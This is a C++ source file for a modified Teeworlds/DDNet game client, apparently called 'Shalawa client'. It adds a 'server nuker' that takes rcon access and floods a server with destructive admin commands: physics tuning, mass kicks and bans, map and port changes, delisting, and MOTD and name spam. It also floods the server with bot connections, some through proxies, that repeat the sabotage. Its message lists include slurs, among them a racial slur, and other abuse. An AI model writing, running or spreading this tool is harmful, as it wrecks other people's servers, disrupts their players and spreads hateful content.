#include "server_nuker.h"

#include <base/math.h>
#include <base/system.h>
#include <engine/shared/config.h>
#include <game/client/gameclient.h>
#include <game/client/components/shalawa/dummyesconnector/dummy_manager.h>

CServerNuker::CServerNuker()
{
	m_Active = false;
	m_LastCommandTime = 0;
	m_LastDummyConnectTime = 0;
	m_LastDummySpamTime = 0;
	m_CommandIndex = 0;
	m_CycleCount = 0;
	m_Phase = 0;
	m_PasswordSaved = false;
	m_aSavedRconPassword[0] = '\0';
	m_aSavedRconUsername[0] = '\0';
	m_Rng.seed(std::random_device{}());
}

void CServerNuker::OnConsoleInit()
{
	Console()->Register("sh_nuke", "?s[rcon_password]", CFGFLAG_CLIENT, ConNuke, this, "Start server nuker (requires rcon)");
	Console()->Register("sh_nuke_stop", "", CFGFLAG_CLIENT, ConNukeStop, this, "Stop server nuker");
}

void CServerNuker::OnReset()
{
	Stop();
}

void CServerNuker::ConNuke(IConsole::IResult *pResult, void *pUserData)
{
	CServerNuker *pSelf = (CServerNuker *)pUserData;
	if(pResult->NumArguments() > 0)
	{
		str_copy(pSelf->m_aSavedRconPassword, pResult->GetString(0), sizeof(pSelf->m_aSavedRconPassword));
		pSelf->m_PasswordSaved = true;
	}
	pSelf->Start();
}

void CServerNuker::ConNukeStop(IConsole::IResult *pResult, void *pUserData)
{
	((CServerNuker *)pUserData)->Stop();
}

std::string CServerNuker::RandomMessage()
{
    const char *apMsgs[] = {
        "OMGG I COOL!!", 
        "GET NUKED LMAO", 
        "shalawa on top", 
        "server go brrrr",
        "bye bye server", 
        "nuked by shalawa", 
        "L + ratio + nuked", 
        "gg ez nuke",
        "rip server lol", 
        "shalawa was here", 
        "ur server is mine now",
        "imagine having weak rcon", 
        "shalawa client best client",
        "nuke goes brrr", 
        "haha server go boom", 
        "rcon? more like r-gone",
        "this server is toast", 
        "shalawa sends regards",
        "nuking in progress...", 
        "gg no re server", 
        "n...noo.. ur server been nuked?...~",
        "GET SHALAWA'D",
        "server dead af",
        "shalawa supremacy",
        "brrrrrrrrr nuke drop",
        "L + ratio + no rcon",
        "weakest rcon eu",
        "owned by shalawa",
        "server go night night",
        "cry more kid",
        "skill issue: server",
        "shalawa diff",
        "ez nuke ez life",
        "your rcon my toy",
        "server status: nuked",
        "shalawa gang",
        "no survivors",
        "get absolutely clapped",
        "server got ratio'd",
        "brap brap nuke",
        "shalawa client 2026 op",
        "imagine not using shalawa",
        "rcon gone bruh",
        "server.exe has stopped working",
        "gg server wp (you lost)",
        "shalawa was here xdddd",
        "touch grass after this",
        "mad cuz bad",
        "seethe and cope",
        "this server is cooked",
        "nuclear shalawa",
        "shalawa on god",
        "top 1 nuker",
        "free nuke thanks for 12345",
        "boom server gone",
        "everyone ded lmao",
        "ded server ded chat",
        "shalawa forever",
        "get rekt get nuked",
        "LMAOOOOO nuked",
        "server on suicide watch",
        "ratio + fatherless server",
        "shalawa sends his regards",
        "nuke delivered successfully",
        "no protection = free real estate",
        "server my bitch now",
        "haha get fucked",
        "5H4L4W4 0N T0P",
        "NUK3D BY 5H4L4W4",
        "S3RV3R G0 BRRRRR",
        "0WN3D LMA0",
        "shalawa na verhu",
        "serveru pizdec",
        "vse sosut",
        "nahuy vash server",
        "shalawa vladeet",
        "easy clap server",
        "too ez too free",
        "server got violated",
        "shalawa best client",
        "weak admin = free nuke",
        "server go boom boom",
        "gg no server",
        "shalawa was here bitch"
    };

    std::uniform_int_distribution<int> MsgDist(0, (int)(std::size(apMsgs) - 1));
    std::uniform_int_distribution<int> NumDist(10000, 99999);
    char aBuf[256];
    str_format(aBuf, sizeof(aBuf), "%s %d", apMsgs[MsgDist(m_Rng)], NumDist(m_Rng));
    return std::string(aBuf);
}

std::string CServerNuker::RandomBroadcast()
{
	const char *apBc[] = {
		"===== NUKED BY SHALAWA =====", ">> SHALAWA CLIENT WAS HERE <<",
		"!!! SERVER NUKED !!!", "SHALAWA >> ALL", "GET REKT - SHALAWA",
		"YOUR SERVER BELONGS TO SHALAWA", "NUKE NUKE NUKE",
		"SHALAWA NUKER ACTIVE", "RIP THIS SERVER LOL",
		"BOOM - SHALAWA STRIKES AGAIN", "UR SERVER GET FUCKED NIGGA", "OMG UR ADMIN NUKED UR SERVER?",
        "WOWW THIS IS A NUKE????"
	};
	std::uniform_int_distribution<int> Dist(0, (int)(std::size(apBc) - 1));
	std::uniform_int_distribution<int> NumDist(100, 999);
	char aBuf[256];
	str_format(aBuf, sizeof(aBuf), "%s [%d]", apBc[Dist(m_Rng)], NumDist(m_Rng));
	return std::string(aBuf);
}

static const char *s_apAllTuneNames[] = {
	"ground_control_speed", "ground_control_accel", "ground_friction",
	"ground_jump_impulse", "air_jump_impulse", "air_control_speed",
	"air_control_accel", "air_friction", "hook_length", "hook_fire_speed",
	"hook_drag_accel", "hook_drag_speed", "gravity", "velramp_start",
	"velramp_range", "velramp_curvature", "gun_curvature", "gun_speed",
	"gun_lifetime", "shotgun_curvature", "shotgun_speed", "shotgun_speeddiff",
	"shotgun_lifetime", "grenade_curvature", "grenade_speed", "grenade_lifetime",
	"laser_reach", "laser_bounce_delay", "laser_bounce_num", "laser_bounce_cost",
	"laser_damage", "player_collision", "player_hooking", "jetpack_strength",
	"shotgun_strength", "explosion_strength", "hammer_strength", "hook_duration",
	"hammer_fire_delay", "gun_fire_delay", "shotgun_fire_delay",
	"grenade_fire_delay", "laser_fire_delay", "ninja_fire_delay",
	"hammer_hit_fire_delay", "ground_elasticity_x", "ground_elasticity_y",
};

void CServerNuker::BuildCommandList()
{
	m_vCommands.clear();

	m_vCommands.push_back("sv_max_clients 64");
	m_vCommands.push_back("sv_max_clients_per_ip 64");
	m_vCommands.push_back("broadcast ===== SHALAWA NUKE =====");
	m_vCommands.push_back("say \"Shalawa Nuker activated. RIP server.\"");

	std::uniform_real_distribution<float> ValDist(-10000.0f, 10000.0f);
	std::uniform_int_distribution<int> IntDist(-99999, 99999);

	for(int wave = 0; wave < 5; wave++)
	{
		for(auto &pTune : s_apAllTuneNames)
		{
			char aBuf[256];
			str_format(aBuf, sizeof(aBuf), "tune %s %f", pTune, ValDist(m_Rng));
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 64; i++)
		{
			char aBuf[128];
			str_format(aBuf, sizeof(aBuf), "kick %d \"Shalawa Nuke %d\"", i, IntDist(m_Rng));
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 30; i++)
		{
			char aBuf[512];
			str_format(aBuf, sizeof(aBuf), "say \"%s\"", RandomMessage().c_str());
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 20; i++)
		{
			char aBuf[512];
			str_format(aBuf, sizeof(aBuf), "broadcast %s", RandomBroadcast().c_str());
			m_vCommands.push_back(aBuf);
		}

		for(int z = 0; z < 64; z++)
		{
			for(auto &pTune : s_apAllTuneNames)
			{
				char aBuf[256];
				str_format(aBuf, sizeof(aBuf), "tune_zone %d %s %f", z, pTune, ValDist(m_Rng));
				m_vCommands.push_back(aBuf);
			}
		}

		for(int i = 0; i < 10; i++)
		{
			char aBuf[1024];
			std::string LongMsg;
			for(int j = 0; j < 20; j++)
				LongMsg += "SHALAWA_NUKE ";
			str_format(aBuf, sizeof(aBuf), "sv_motd \"%s\"", LongMsg.c_str());
			m_vCommands.push_back(aBuf);
		}

		{
			char aBuf[512];
			std::string SpamName;
			for(int j = 0; j < 30; j++)
				SpamName += "NUKED";
			str_format(aBuf, sizeof(aBuf), "sv_name %s", SpamName.c_str());
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 50; i++)
		{
			char aBuf[256];
			std::uniform_int_distribution<int> MapDist(0, 4);
			const char *apMaps[] = {"ctf1", "dm1", "ctf2", "dm2", "ctf3"};
			str_format(aBuf, sizeof(aBuf), "sv_map %s", apMaps[MapDist(m_Rng)]);
			m_vCommands.push_back(aBuf);
		}

		m_vCommands.push_back("sv_tournament_mode 1");
		m_vCommands.push_back("sv_warmup 99999");
		m_vCommands.push_back("sv_register 0");
		m_vCommands.push_back("sv_scorelimit 0");
		m_vCommands.push_back("sv_timelimit 0");
		m_vCommands.push_back("shuffle_teams");
		m_vCommands.push_back("swap_teams");
		m_vCommands.push_back("restart 1");

		for(int i = 0; i < 64; i++)
		{
			char aBuf[64];
			str_format(aBuf, sizeof(aBuf), "ban %d 5 \"Shalawa\"", i);
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 64; i++)
		{
			m_vCommands.push_back("unban_all");
		}

		for(int i = 0; i < 64; i++)
		{
			char aBuf[128];
			str_format(aBuf, sizeof(aBuf), "force_vote \"kick\" \"%d\" \"shalawa nuke\"", i);
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 20; i++)
		{
			char aBuf[128];
			std::uniform_int_distribution<int> PortDist(8300, 8400);
			str_format(aBuf, sizeof(aBuf), "sv_port %d", PortDist(m_Rng));
			m_vCommands.push_back(aBuf);
		}

		for(int i = 0; i < 64; i++)
		{
			char aBuf[128];
			str_format(aBuf, sizeof(aBuf), "set_team %d -1", i);
			m_vCommands.push_back(aBuf);
		}
	}

	std::shuffle(m_vCommands.begin() + 4, m_vCommands.end(), m_Rng);
}

void CServerNuker::DummyFloodConnect()
{
	CDummyManager *pDummyMgr = &GameClient()->m_DummyManager;

	for(int i = 0; i < MAX_EXTRA_DUMMIES; i++)
	{
		CDummyConfig *pDummy = pDummyMgr->GetDummyConfig(i);
		if(!pDummy || pDummy->m_Connected)
			continue;

		std::uniform_int_distribution<int> NameDist(1000, 9999);
		char aName[16];
		str_format(aName, sizeof(aName), "Nuke_%d", NameDist(m_Rng));
		str_copy(pDummy->m_aName, aName, sizeof(pDummy->m_aName));
		str_copy(pDummy->m_aClan, "NIGG NUKED", sizeof(pDummy->m_aClan));
		str_copy(pDummy->m_aSkin, "default", sizeof(pDummy->m_aSkin));
		pDummy->m_UseCustomColor = 1;
		pDummy->m_ColorBody = 0xFF0000;
		pDummy->m_ColorFeet = 0xFF0000;

		int Slot = Client()->ExtraDummyConnect(
			i, pDummy->m_aName, pDummy->m_aClan, pDummy->m_aSkin,
			pDummy->m_UseCustomColor, pDummy->m_ColorBody, pDummy->m_ColorFeet,
			pDummy->m_UseSocks5, pDummy->m_aSocks5Addr,
			pDummy->m_aSocks5User, pDummy->m_aSocks5Pass);

		if(Slot >= 0)
			pDummy->m_Connected = true;
	}
}

void CServerNuker::DummySpamAll()
{
	CDummyManager *pDummyMgr = &GameClient()->m_DummyManager;
	std::uniform_real_distribution<float> ValDist(-10000.0f, 10000.0f);

	for(int i = 0; i < MAX_EXTRA_DUMMIES; i++)
	{
		CDummyConfig *pDummy = pDummyMgr->GetDummyConfig(i);
		if(!pDummy || !pDummy->m_Connected)
			continue;

		if(m_PasswordSaved && !Client()->ExtraDummyRconAuthed(i))
			Client()->ExtraDummyRconAuth(i, m_aSavedRconUsername, m_aSavedRconPassword);

		if(!Client()->ExtraDummyRconAuthed(i))
			continue;

		for(int burst = 0; burst < 5; burst++)
		{
			char aBuf[512];

			str_format(aBuf, sizeof(aBuf), "say \"%s\"", RandomMessage().c_str());
			Client()->ExtraDummyRcon(i, aBuf);

			str_format(aBuf, sizeof(aBuf), "broadcast %s", RandomBroadcast().c_str());
			Client()->ExtraDummyRcon(i, aBuf);

			std::uniform_int_distribution<int> TuneIdx(0, (int)(std::size(s_apAllTuneNames) - 1));
			str_format(aBuf, sizeof(aBuf), "tune %s %f", s_apAllTuneNames[TuneIdx(m_Rng)], ValDist(m_Rng));
			Client()->ExtraDummyRcon(i, aBuf);

			std::uniform_int_distribution<int> KickDist(0, 63);
			str_format(aBuf, sizeof(aBuf), "kick %d \"Shalawa %d\"", KickDist(m_Rng), KickDist(m_Rng));
			Client()->ExtraDummyRcon(i, aBuf);

			std::uniform_int_distribution<int> ZoneDist(0, 63);
			str_format(aBuf, sizeof(aBuf), "tune_zone %d %s %f",
				ZoneDist(m_Rng), s_apAllTuneNames[TuneIdx(m_Rng)], ValDist(m_Rng));
			Client()->ExtraDummyRcon(i, aBuf);

			std::string LongMotd;
			for(int k = 0; k < 50; k++)
				LongMotd += "NUKED BY @shalawa_client ";
			str_format(aBuf, sizeof(aBuf), "sv_motd \"%s\"", LongMotd.c_str());
			Client()->ExtraDummyRcon(i, aBuf);
		}
	}
}

void CServerNuker::Start()
{
	if(!Client()->RconAuthed())
	{
		GameClient()->Echo("Shalawa Nuker: No rcon access.");
		return;
	}

	m_Active = true;
	m_CommandIndex = 0;
	m_CycleCount = 0;
	m_Phase = 0;
	m_LastCommandTime = time_get();
	m_LastDummyConnectTime = time_get();
	m_LastDummySpamTime = time_get();

	BuildCommandList();

	GameClient()->Echo("Shalawa Nuker: Nuke started.");

	Client()->Rcon("sv_max_clients 64");
	Client()->Rcon("sv_max_clients_per_ip 64");
}

void CServerNuker::Stop()
{
	if(m_Active)
		GameClient()->Echo("Shalawa Nuker: Stopped.");

	m_Active = false;
	m_CommandIndex = 0;
	m_CycleCount = 0;
	m_Phase = 0;
	m_vCommands.clear();
}

void CServerNuker::SendNextCommand()
{
	if(!Client()->RconAuthed())
	{
		Stop();
		return;
	}

	if(m_CommandIndex >= (int)m_vCommands.size())
	{
		m_CycleCount++;
		if(m_CycleCount < 50)
		{
			BuildCommandList();
			m_CommandIndex = 0;
		}
		else
		{
			m_Phase = 2;
			return;
		}
	}

	Client()->Rcon(m_vCommands[m_CommandIndex].c_str());
	m_CommandIndex++;
}

void CServerNuker::OnRender()
{
	if(!m_Active)
		return;

	if(Client()->State() != IClient::STATE_ONLINE)
	{
		Stop();
		return;
	}

	int64_t Now = time_get();
	int64_t Freq = time_freq();

	int64_t CmdInterval = Freq / 100;
	if(Now - m_LastCommandTime >= CmdInterval)
	{
		for(int burst = 0; burst < 10; burst++)
		{
			if(m_Phase < 2)
				SendNextCommand();

			Client()->Rcon(("say \"" + RandomMessage() + "\"").c_str());
			Client()->Rcon(("broadcast " + RandomBroadcast()).c_str());

			std::uniform_int_distribution<int> TuneIdx(0, (int)(std::size(s_apAllTuneNames) - 1));
			std::uniform_real_distribution<float> ValDist(-99999.0f, 99999.0f);
			char aTune[256];
			str_format(aTune, sizeof(aTune), "tune %s %f", s_apAllTuneNames[TuneIdx(m_Rng)], ValDist(m_Rng));
			Client()->Rcon(aTune);

			std::uniform_int_distribution<int> ZoneDist(0, 255);
			str_format(aTune, sizeof(aTune), "tune_zone %d %s %f",
				ZoneDist(m_Rng), s_apAllTuneNames[TuneIdx(m_Rng)], ValDist(m_Rng));
			Client()->Rcon(aTune);

			std::uniform_int_distribution<int> KickDist(0, 63);
			char aKick[128];
			str_format(aKick, sizeof(aKick), "kick %d \"SHALAWA %d\"", KickDist(m_Rng), KickDist(m_Rng));
			Client()->Rcon(aKick);
		}

		m_LastCommandTime = Now;
	}

	int64_t DummyConnectInterval = Freq / 10;
	if(Now - m_LastDummyConnectTime >= DummyConnectInterval)
	{
		DummyFloodConnect();
		m_LastDummyConnectTime = Now;
	}

	int64_t DummySpamInterval = Freq / 15;
	if(Now - m_LastDummySpamTime >= DummySpamInterval)
	{
		DummySpamAll();
		m_LastDummySpamTime = Now;
	}
}